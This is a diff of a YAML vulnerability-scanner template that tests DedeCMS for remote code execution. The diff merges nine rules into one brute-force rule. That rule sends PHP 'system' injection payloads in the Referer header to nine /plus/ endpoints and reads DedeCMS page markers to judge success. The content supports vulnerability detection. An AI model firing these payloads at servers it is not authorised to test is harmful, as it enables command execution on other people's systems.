@@ -14,120 +14,32 @@ info:
 
 rules:
   r0:
+    brute:
+      mode: pitchfork
+      commit: winner
+      continue: false
+      p:
+        - /plus/flink.php?dopost=save
+        - /plus/users_products.php?oid=1337
+        - /plus/download.php?aid=1337
+        - /plus/showphoto.php?aid=1337
+        - /plus/users-do.php?fmdo=sendMail
+        - /plus/posttocar.php?id=1337
+        - /plus/vote.php?dopost=view
+        - /plus/carbuyaction.php?do=clickout
+        - /plus/recommend.php?c=dir
+      ref:
+        - <?php "system"(ls);?>
+        - <?php "system"(ls);?>
+        - <?php "system"(ls);?>
+        - <?php "system"(ls);?>
+        - <?php "system"(ls);?>
+        - <?php "system"(ls);?>
+        - <?php "system"(ls);?>
+        - <?php "system"(ls);?>
+        - <?php "system"($c);/*
     request:
       method: GET
-      path: /plus/flink.php?dopost=save
-      headers:
-        Accept: "*/*"
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
-        X-Requested-With: XMLHttpRequest
-        Referer: <?php "system"(ls);?>
-        Accept-Encoding: gzip, deflate
-        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
-        Connection: close
+      path: "{{p}}"
     expression: response.status == 200 && response.body.bcontains(b'DedeCMS 提示信息！') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')
-  r1:
-    request:
-      method: GET
-      path: /plus/users_products.php?oid=1337
-      headers:
-        Accept: "*/*"
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
-        X-Requested-With: XMLHttpRequest
-        Referer: <?php "system"(ls);?>
-        Accept-Encoding: gzip, deflate
-        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
-        Connection: close
-    expression: response.status == 200 && response.body.bcontains(b'DedeCMS 提示信息！') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')
-  r2:
-    request:
-      method: GET
-      path: /plus/download.php?aid=1337
-      headers:
-        Accept: "*/*"
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
-        X-Requested-With: XMLHttpRequest
-        Referer: <?php "system"(ls);?>
-        Accept-Encoding: gzip, deflate
-        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
-        Connection: close
-    expression: response.status == 200 && response.body.bcontains(b'DedeCMS 提示信息！') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')
-  r3:
-    request:
-      method: GET
-      path: /plus/showphoto.php?aid=1337
-      headers:
-        Accept: "*/*"
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
-        X-Requested-With: XMLHttpRequest
-        Referer: <?php "system"(ls);?>
-        Accept-Encoding: gzip, deflate
-        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
-        Connection: close
-    expression: response.status == 200 && response.body.bcontains(b'DedeCMS 提示信息！') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')
-  r4:
-    request:
-      method: GET
-      path: /plus/users-do.php?fmdo=sendMail
-      headers:
-        Accept: "*/*"
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
-        X-Requested-With: XMLHttpRequest
-        Referer: <?php "system"(ls);?>
-        Accept-Encoding: gzip, deflate
-        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
-        Connection: close
-    expression: response.status == 200 && response.body.bcontains(b'DedeCMS 提示信息！') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')
-  r5:
-    request:
-      method: GET
-      path: /plus/posttocar.php?id=1337
-      headers:
-        Accept: "*/*"
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
-        X-Requested-With: XMLHttpRequest
-        Referer: <?php "system"(ls);?>
-        Accept-Encoding: gzip, deflate
-        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
-        Connection: close
-    expression: response.status == 200 && response.body.bcontains(b'DedeCMS 提示信息！') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')
-  r6:
-    request:
-      method: GET
-      path: /plus/vote.php?dopost=view
-      headers:
-        Accept: "*/*"
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
-        X-Requested-With: XMLHttpRequest
-        Referer: <?php "system"(ls);?>
-        Accept-Encoding: gzip, deflate
-        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
-        Connection: close
-    expression: response.status == 200 && response.body.bcontains(b'DedeCMS 提示信息！') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')
-  r7:
-    request:
-      method: GET
-      path: /plus/carbuyaction.php?do=clickout
-      headers:
-        Accept: "*/*"
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
-        X-Requested-With: XMLHttpRequest
-        Referer: <?php "system"(ls);?>
-        Accept-Encoding: gzip, deflate
-        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
-        Connection: close
-    expression: response.status == 200 && response.body.bcontains(b'DedeCMS 提示信息！') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')
-  r8:
-    request:
-      method: GET
-      path: /plus/recommend.php?c=dir
-      headers:
-        Accept: "*/*"
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
-        X-Requested-With: XMLHttpRequest
-        Referer: <?php "system"($c);/*
-        Accept-Encoding: gzip, deflate
-        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
-        Connection: close
-    expression: response.status == 200 && response.body.bcontains(b'DedeCMS 提示信息！') && response.body.bcontains(b'mytag_js.php') && response.body.bcontains(b'digg_ajax.php')
-expression: r0() || r1() || r2() || r3() || r4() || r5() || r6() || r7() || r8()
+expression: r0()
